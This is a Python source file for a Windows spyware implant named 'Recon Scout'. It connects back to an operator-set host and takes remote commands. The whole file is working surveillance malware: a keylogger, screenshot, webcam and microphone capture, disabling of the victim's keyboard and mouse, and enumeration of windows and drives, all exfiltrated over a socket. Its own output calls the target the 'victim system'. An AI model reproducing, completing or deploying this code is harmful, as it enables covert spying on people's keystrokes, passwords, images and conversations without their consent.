import socket, os, pickle, ctypes, win32api, pyHook, pythoncom, pyaudio, wave, webbrowser, cv2
from threading import Thread
from platform import platform
from getpass import getuser
from time import sleep
from datetime import datetime
from mss import mss
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

port = !!!!!
ip_addr = @@@@@
lkey = #####
End = $$$$$
skey = %%%%%
time_to_sleep = ^^^^^
type_of_scout = 'Recon Scout'
try:
    operating_sys = platform()
except:
    operating_sys = '?????'
try:
    hostname = socket.gethostname()
except:
    hostname = '?????'
try:
    username = getuser()
except:
    username = '?????'
userinfo = hostname + '/' + username
scout_data = [skey, lkey, userinfo, type_of_scout, operating_sys]
s = None
key_buffer = ''
stopkey = None
stopmse = None
window = None
kill_keylog_thread = False
active = False
non_represent = 'qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890'

help_menu = '''\nRecon Scout Menu
==================

   Global Commands :
      banner                            Display a banner
      clear                             Clear the screen
      help                              Show the help menu
      local <shell command>             Locally execute a shell command
      python                            Enter the system python interpreter
      quit                              Quit the framework
   
   Connection commands :
      disconnect                        Make the scout disconnect and try to reconnect
      terminate                         Kill the scout process
      sleep <seconds>                   Disconnect the scout and make it sleep for some time

   Handler commands :
      back                              Move back to scout handler

   Recon Commands :
      active                            Show all currently open and active windows
      browse <URL>                      Open a URL with default browser
      drives                            List all drives
      inter <enable/disable> <key/mouse>Enable or disable the keyboard or mouse interface
      screen                            Take a screenshot
      show_keylog                       Show keylogged keys in buffer
      start_keylog                      Start keylogger
      stop_keylog                       Stop keylogger

   Webcam Commands :
      webcam                            Snap a picture from the default webcam and download 

   Audio Commands :
      rec_audio <seconds>               Record audio for a specified amount of time
      set_audio <int/float>             Set audio to specified integer or float\n'''


def set_audio(number):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = ctypes.cast(interface, ctypes.POINTER(IAudioEndpointVolume))
    range_vol = volume.GetVolumeRange()
    s.sendall('[1m[34m[*][0mMax Volume number(100%) : ' + str(range_vol[1]))
    s.sendall('\n[*]Minimum Volume number(0%) : ' + str(range_vol[0]))
    s.sendall('\n[*]Setting volume to : ' + str(number))
    try:
        volume.SetMasterVolumeLevel(float(number), None)
        s.send('\n[1m[32m[+][0mVolume set'+End)
    except:
        s.send('\n[1m[31m[-][0mError setting volume, invalid argument'+End)


def record_audio(seconds):
    namef = datetime.now().strftime("%Y%m%d-%H%M%S") + '.wav'
    FORMAT = pyaudio.paInt16
    CHANNELS = 2
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = seconds
    WAVE_OUTPUT_FILENAME = namef
    audio = pyaudio.PyAudio()
    stream = audio.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True,
                        frames_per_buffer=CHUNK)
    frames = []
    for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
        data = stream.read(CHUNK)
        frames.append(data)
    stream.stop_stream()
    stream.close()
    audio.terminate()
    waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
    waveFile.setnchannels(CHANNELS)
    waveFile.setsampwidth(audio.get_sample_size(FORMAT))
    waveFile.setframerate(RATE)
    waveFile.writeframes(b''.join(frames))
    waveFile.close()
    download_file(namef)
    os.remove(namef)


def download_file(file_name):
    if os.path.isfile(file_name):
        try:
            f = open(file_name, 'rb')
            bin_data = f.read()
            f.close()
            s.sendall(file_name + '|/' + bin_data + End)
        except Exception as e:
            s.sendall('[-]Error reading from file "' + file_name + '" : ' + str(e) + End)
    else:
        s.sendall('[-]File path/name is not valid' + End)


def OnEvent(event):
    global key_buffer, window
    try:
        if event.WindowName != window:
            new_win_msg = 'User started typing in new window : ' + event.WindowName
            seperator = '=' * len(new_win_msg)
            key_buffer += '\n\n' + new_win_msg + '\n' + seperator + '\n\n'
            window = event.WindowName
        else:
            window = event.WindowName
        log = event.Key.lower()
        if log == 'space':
            log = ' '
        elif log == 'return':
            log = '<' + log + '>\n'
        elif log not in non_represent:
            log = '<' + log + '>'
        key_buffer += log
    except:
        key_buffer += '<Error>'
    return True


def start_key_log():
    global kill_keylog_thread
    hm = pyHook.HookManager()
    hm.KeyDown = OnEvent
    hm.HookKeyboard()
    while True:
        if kill_keylog_thread is True:
            hm.UnhookKeyboard()
            ctypes.windll.user32.PostQuitMessage(0)
            return
        else:
            pythoncom.PumpWaitingMessages()


def disable_event(event):
    return False


def disable_key():
    try:
        dk = pyHook.HookManager()
        dk.KeyAll = disable_event
        dk.HookKeyboard()
        s.send('[+]Keyboard interface disabled' + End)
        while True:
            if stopkey is True:
                ctypes.windll.user32.PostQuitMessage(0)
                dk.UnhookKeyboard()
                return
            pythoncom.PumpWaitingMessages()
    except Exception as e:
        s.send('[-]Error disabling keyboard interface : ' + str(e) + End)


def disable_mouse():
    try:
        dm = pyHook.HookManager()
        dm.MouseAll = disable_event
        dm.HookMouse()
        s.send('[+]Mouse interface disabled' + End)
        while True:
            if stopmse is True:
                ctypes.windll.user32.PostQuitMessage(0)
                dm.UnhookMouse()
                return
            pythoncom.PumpWaitingMessages()
    except Exception as e:
        s.send('[-]Error disabling mouse interface : ' + str(e) + End)


def recvall(tar_socket):
    tar_socket.settimeout(None)
    data = tar_socket.recv(9999)
    if not data:
        return ''
    while True:
        if data.endswith(End):
            try:
                tar_socket.settimeout(1)
                more_data = tar_socket.recv(9999)
                if not more_data:
                    return data[:-len(End)]
                data += more_data
            except (socket.timeout,socket.error):
                tar_socket.settimeout(None)
                return data[:-len(End)]
        else:
            more_data = tar_socket.recv(9999)
            data += more_data

def screenshot():
    try:
        tar_file = datetime.now().strftime("%Y%m%d-%H%M%S") + '.png'
        with mss() as sct:
            sct.shot(output=tar_file)
        download_file(tar_file)
        os.remove(tar_file)
    except Exception as e:
        s.sendall('[-]Error taking screenshot : ' + str(e) + End)

def web_cam_user():
    try:
        tar_file = datetime.now().strftime("%Y%m%d-%H%M%S") + '.png'
        camera_port = 0
        ramp_frames = 30
        camera = cv2.VideoCapture(camera_port)
        def get_image():
            retval, im = camera.read()
            return im
        for i in xrange(ramp_frames):
            temp = get_image()
        camera_capture = get_image()
        if not camera_capture:
            s.sendall('[-]Could not take webcam snapshot, webcam not configured properly' + End)
            return
        cv2.imwrite(tar_file, camera_capture)
        camera = None
        download_file(tar_file)
        os.remove(tar_file)
    except Exception as e:
        s.sendall('[-]Error taking webcam snapshot : ' + str(e) + End)


def main():
    global s, stopkey, stopmse, active, key_buffer, kill_keylog_thread
    while True:
        while True:
            try:
                s = socket.socket()
                s.connect((ip_addr, port))
                break
            except socket.error:
                sleep(time_to_sleep)
                continue
        s.sendall(pickle.dumps(scout_data) + End)
        while True:
            try:
                data = recvall(s).split(' ', 1)
                command = data[0]
                if command == 'help':
                    s.sendall(help_menu + End)
                elif command == 'disconnect':
                    s.sendall('[*]Disconnecting...' + End)
                    sleep(5)
                    break
                elif command == 'terminate':
                    s.sendall('[*]Terminating scout...' + End)
                    os._exit(1)
                elif command == 'sleep':
                    try:
                        sleep_time = int(data[1])
                    except:
                        s.sendall('[-]Please specify an integer as the sleep duration' + End)
                        continue
                    s.sendall('[*]Scout going offline for : ' + str(sleep_time) + ' seconds' + End)
                    s.shutdown(1)
                    s.close()
                    for i in range(sleep_time):
                        sleep(1)
                    break
                elif command == 'active':
                    EnumWindows = ctypes.windll.user32.EnumWindows
                    EnumWindowsProc = ctypes.WINFUNCTYPE(ctypes.c_bool, ctypes.POINTER(ctypes.c_int),
                                                         ctypes.POINTER(ctypes.c_int))
                    GetWindowText = ctypes.windll.user32.GetWindowTextW
                    GetWindowTextLength = ctypes.windll.user32.GetWindowTextLengthW
                    IsWindowVisible = ctypes.windll.user32.IsWindowVisible
                    titles = []

                    def foreach_window(hwnd, lParam):
                        if IsWindowVisible(hwnd):
                            length = GetWindowTextLength(hwnd)
                            buff = ctypes.create_unicode_buffer(length + 1)
                            GetWindowText(hwnd, buff, length + 1)
                            titles.append(buff.value)
                        return True

                    EnumWindows(EnumWindowsProc(foreach_window), 0)
                    active_win = '|/'.join(titles)
                    s.sendall(active_win + End)
                elif command == 'browse':
                    try:
                        webbrowser.open(data[1])
                        s.sendall('[+]Opened URL : ' + data[1] + End)
                    except IndexError:
                        s.sendall('[-]Specify a URL to open' + End)
                    except webbrowser.Error:
                        s.sendall('[-]Browser error' + End)
                elif command == 'drives':
                    drives = win32api.GetLogicalDriveStrings()
                    drives = drives.split('\000')[:-1]
                    s.sendall('|/'.join(drives) + End)
                elif command == 'inter':
                    try:
                        action = data[1].split(' ')[0]
                    except IndexError:
                        s.sendall('[-]Invalid syntax to disable key/mouse interface' + End)
                        continue
                    try:
                        interface = data[1].split(' ')[1]
                    except IndexError:
                        s.sendall('[-]Invalid syntax to disable key/mouse interface' + End)
                        continue
                    if action == 'disable':
                        if interface == 'key':
                            stopkey = False
                            kt = Thread(target=disable_key, args=())
                            kt.start()
                        elif interface == 'mouse':
                            stopmse = False
                            mt = Thread(target=disable_mouse, args=())
                            mt.start()
                        elif interface == 'all':
                            stopkey = False
                            kt = Thread(target=disable_key, args=())
                            kt.start()
                            stopmse = False
                            mt = Thread(target=disable_mouse, args=())
                            mt.start()
                            s.sendall('[+]All interfaces disabled, use key/mouse' + End)
                        else:
                            s.send('[-]Invalid interface' + End)
                    elif action == 'enable':
                        if interface == 'key':
                            stopkey = True
                            s.sendall('[+]Keyboard interface has been enabled' + End)
                        elif interface == 'mouse':
                            stopmse = True
                            s.sendall('[+]Mouse interface has been enabled' + End)
                        elif interface == 'all':
                            stopmse = True
                            stopkey = True
                            s.sendall('[+]All interfaces enabled' + End)
                        else:
                            s.sendall('[-]Invalid interface, use key/mouse' + End)
                    else:
                        s.sendall('[-]Invalid interface command use enable/disable' + End)
                elif command == 'screen':
                    screenshot()
                elif command == 'show_keylog':
                    s.sendall(key_buffer + End)
                    key_buffer = ''
                elif command == 'start_keylog':
                    if not active:
                        kill_keylog_thread = False
                        t = Thread(target=start_key_log, args=())
                        t.start()
                        active = True
                        s.sendall('[+]Keylogger logging to buffer' + End)
                    elif active:
                        s.sendall('[-]Keylogger is already active' + End)
                elif command == 'stop_keylog':
                    if active:
                        kill_keylog_thread = True
                        active = False
                        s.send('[+]Keylogger process killed!' + End)
                    elif not active:
                        s.send('[-]No keylogger process has started on victim system' + End)
                elif command == 'rec_audio':
                    try:
                        seconds = int(data[1])
                        record_audio(seconds)
                    except (IndexError, TypeError):
                        s.sendall('[-]Please supply an integer as the argument' + End)
                elif command == 'set_audio':
                    try:
                        level = float(data[1])
                        set_audio(level)
                    except (IndexError,TypeError):
                        s.sendall('[-]Provide float/int as an arg'+End)
                elif command == 'webcam':
                    web_cam_user()
                elif command == 'ping':
                    s.sendall('[+]Scout is alive' + End)
                else:
                    s.sendall('[-]Unknown command "' + command + '", run "help" for help menu' + End)
            except (socket.error, socket.timeout):
                try:
                    s.shutdown(1)
                    s.close()
                    break
                except socket.error:
                    break
            except Exception as e:
                try:
                    if command:
                        s.sendall('[-]Error, last run command : ' + command + '. Error message : ' + str(e) + End)
                    else:
                        s.sendall('[-]Error message : ' + str(e) + End)
                except:
                    s.shutdown(1)
                    s.close()
                    break


main()
